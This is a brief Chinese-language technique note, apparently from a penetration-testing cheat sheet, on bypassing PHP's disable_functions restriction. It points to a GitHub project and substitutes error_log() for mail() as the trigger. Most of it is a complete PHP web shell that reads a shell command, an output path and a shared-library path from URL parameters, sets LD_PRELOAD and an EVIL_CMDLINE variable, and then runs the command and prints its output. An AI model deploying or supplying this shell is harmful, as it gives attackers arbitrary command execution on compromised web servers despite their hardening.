## error_log

> https://github.com/ianxtianxt/bypass_disablefunc_via_LD_PRELOAD/blob/master/bypass_disablefunc.php

将mail例子中的mail("", "", "", "");替换为error_log("a",1);

```php
<?php
    echo "<p> <b>example</b>: http://www.baidu.com/bypass_disablefunc.php?cmd=pwd&outpath=/tmp/xx&sopath=/var/www/bypass_disablefunc_x64.so </p>";

    $cmd = $_GET["cmd"];
    $out_path = $_GET["outpath"];
    $evil_cmdline = $cmd . " > " . $out_path . " 2>&1";
    echo "<p> <b>cmdline</b>: " . $evil_cmdline . "</p>";

    putenv("EVIL_CMDLINE=" . $evil_cmdline);

    $so_path = $_GET["sopath"];
    putenv("LD_PRELOAD=" . $so_path);

    error_log("a",1);

    echo "<p> <b>output</b>: <br />" . nl2br(file_get_contents($out_path)) . "</p>"; 

    unlink($out_path);
?>

```

